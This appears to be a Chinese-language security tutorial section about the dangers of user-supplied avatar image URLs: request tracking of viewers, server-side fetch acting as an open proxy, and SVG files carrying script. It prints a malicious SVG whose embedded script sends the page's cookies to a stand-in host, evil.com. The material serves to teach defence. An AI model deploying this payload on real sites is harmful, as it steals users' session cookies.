允许用户填写外部图片地址作为头像，看起来很方便。但每个浏览你主页的人，都可能在不知情中向攻击者的服务器发送了一个请求。

实验 3

SVG 注入：图片里藏代码

SVG 是合法的图片格式，但它本质上是 XML，可以内嵌 JavaScript。如果网站允许引用 .svg 作为头像，攻击者可以注入脚本。

恶意 SVG 文件内容
<svg xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="50" fill="red"/>
  <script>
    // 窃取当前页面 Cookie
    new Image().src = 'https://evil.com/steal?c='
      + document.cookie;
  </script>
</svg>

img 标签加载（安全）

浏览器将 SVG 当作图片渲染，不执行内嵌脚本。

脚本被沙箱隔离

直接嵌入/object/embed（危险）

SVG 内脚本可以执行，拥有当前页面权限。

XSS 攻击成功

为什么「图片 URL」这么危险？

01

img 请求不受同源策略限制

浏览器加载图片时自动发送 GET 请求到任意域名，携带 Referer 头，无需用户授权。

02

请求由查看者的浏览器发出

攻击者的服务器能拿到每个查看帖子的人的 IP、User-Agent、访问时间——精确到秒。

03

服务端抓取 = 开放代理

如果后端主动 fetch 用户提供的URL，等于给了攻击者一个可以探测内网的代理服务器。

04

SVG 是披着图片外衣的 HTML

SVG 支持 script、foreignObject 等元素。用错加载方式就是打开了 XSS 的大门。
